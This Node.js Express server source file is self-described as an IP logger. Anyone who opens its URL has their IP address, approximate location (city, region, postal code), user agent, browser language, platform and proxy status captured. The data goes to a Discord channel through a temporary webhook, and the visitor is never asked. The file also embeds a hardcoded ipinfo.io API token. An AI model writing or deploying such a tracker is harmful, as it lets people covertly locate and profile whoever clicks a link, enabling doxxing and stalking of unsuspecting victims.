const express = require('express');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const fetch = require('isomorphic-fetch');
const app = express();

const botToken = process.env.bot_token; // set bot token to value in vercel dashboard
const channelID = process.env.channel_id; // set channel ID to value in vercel dashboard
const port = process.env.port || 3000; // set port to value in vercel dashboard/default 3000

async function createWebhook(channelID) {
  const url = `https://discord.com/api/v10/channels/${channelID}/webhooks`;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bot ${botToken}`,
      },
      body: JSON.stringify({
        name: 'Logger Webhook', // set the name for the webhook
      }),
    });
    const data = await response.json();
    const webhookID = data.id;
    const webhookToken = data.token;
    return `https://discord.com/api/v10/webhooks/${webhookID}/${webhookToken}`;
  } catch (error) {
    console.error(`Error creating webhook: ${error}`);
    throw error;
  }
}

async function deleteWebhook(webhookUrl) {
  const urlSplit = webhookUrl.split('/');
  const webhookID = urlSplit[5];
  const webhookToken = urlSplit[6];
  const url = `https://discord.com/api/v10/webhooks/${webhookID}/${webhookToken}`;
  try {
    await fetch(url, {
      method: 'DELETE',
      headers: {
        'Authorization': `Bot ${botToken}`,
      },
    });
  } catch (error) {
    console.error(`Error deleting webhook: ${error}`);
    throw error;
  }
}

app.get('/', async (req, res) => {
  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
  const data = await response.json();
  const region = data.region;
  const city = data.city;
  const country = data.country;
  const postal = data.postal;
  const userAgent = req.headers['user-agent'];
  const supportedLanguages = ["en", "nl", "it", 'de', 'ru', 'cn','in','hk'];
  const lang = req.headers['accept-language'].split(',')[0];
  const platform = userAgent && userAgent.split('(')[1].split(')')[0];
  const browser = userAgent.split('/')[0];
  const isProxy = req.headers['via'] || req.headers['x-forwarded-for'];

  try {
    const webhookUrl = await createWebhook(channelID);
    const webhook = new Webhook(webhookUrl);

    const embed = new MessageBuilder()
      .setTitle('IP Logger')
      .setDescription('This is an IP logger made by https://github.com/baum1810')
      .addField('IP', ipAddress)
      .addField('Country', country)
      .addField('Region', region)
      .addField('City', city)
      .addField('Postal', postal)
      .addField('User Agent', userAgent)
      .addField('Browser Language', lang)
      .addField('Platform', platform)
      .addField('Browser', browser)
      .addField('Proxy/VPN', isProxy ? 'Yes' : 'No')
      .setColor('#5CDBF0')
      .setTimestamp();

    await webhook.send(embed);

    // wait for message to be confirmed as received before deleting the webhook
    webhook.on('response', async () => {
      try {
        await deleteWebhook(webhookUrl);
        res.send('Address Logged');
      } catch (error) {
        console.error(`Error deleting webhook: ${error}`);
        res.status(500).send('Internal server error');
      }
    });
  } catch (error) {
    console.error(`Error handling request: ${error}`);
    res.status(500).send('Internal server error');
  }
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
}); 
